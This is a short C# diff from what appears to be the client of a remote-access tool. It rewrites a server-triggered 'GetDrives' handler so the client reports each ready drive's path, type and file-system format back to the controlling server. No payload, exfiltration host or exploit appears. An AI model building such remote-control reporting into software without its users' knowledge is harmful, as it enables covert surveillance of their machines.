@@ -17,7 +17,18 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetDrives(Packets.ServerPackets.GetDrives command, Client client)
         {
-            new Packets.ClientPackets.GetDrivesResponse(Environment.GetLogicalDrives()).Execute(client);
+            var drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
+            if (drives.Length == 0) return;
+
+            string[] displayName = new string[drives.Length];
+            string[] rootDirectory = new string[drives.Length];
+            for (int i = 0; i < drives.Length; i++)
+            {
+                displayName[i] = string.Format("{0} ({1}, {2})", drives[i].RootDirectory.FullName, Helper.Helper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                rootDirectory[i] = drives[i].RootDirectory.FullName;
+            }
+
+            new Packets.ClientPackets.GetDrivesResponse(displayName, rootDirectory).Execute(client);
         }
 
         public static void HandleDoShutdownAction(Packets.ServerPackets.DoShutdownAction command, Client client)
